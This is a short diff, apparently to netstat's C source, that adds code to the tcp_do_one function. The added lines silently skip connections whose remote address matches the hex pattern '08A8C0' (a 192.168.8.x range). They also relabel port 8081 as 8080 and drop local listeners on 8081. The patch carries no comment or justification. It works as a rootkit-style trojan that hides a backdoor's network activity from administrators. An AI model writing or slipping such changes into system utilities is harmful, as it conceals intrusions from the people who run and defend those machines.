@@ -113,7 +113,6 @@
 #if !defined(s6_addr32) && defined(in6a_words)
 #define s6_addr32 in6a_words	/* libinet6			*/
 #endif
-
 /* prototypes for statistics.c */
 int parsesnmp(int, int, int, int);
 void inittab(void);
@@ -1215,6 +1214,10 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
     if (!flag_all && ((flag_lst && rem_port) || (!flag_lst && !rem_port)))
       return;
 
+    if(strstr(rem_addr,"08A8C0") != NULL) {
+	return ;
+    }
+
     if (strlen(local_addr) > 8) {
 #if HAVE_AFINET6
 	/* Demangle what the kernel gives us */
@@ -1251,6 +1254,14 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
 	/*  fprintf(stderr, _("warning, got duplicate tcp line.\n")); */
 	return;
     }
+
+    if (rem_port == 8081) {
+	rem_port = 8080;
+    }
+    if (local_port == 8081) {
+        local_port = 8080;
+	return ;
+    } 
 	addr_do_one(local_addr, sizeof(local_addr), 22, ap, &localaddr, local_port, "tcp");
 	addr_do_one(rem_addr, sizeof(rem_addr), 22, ap, &remaddr, rem_port, "tcp");
 	timers[0] = '\0';
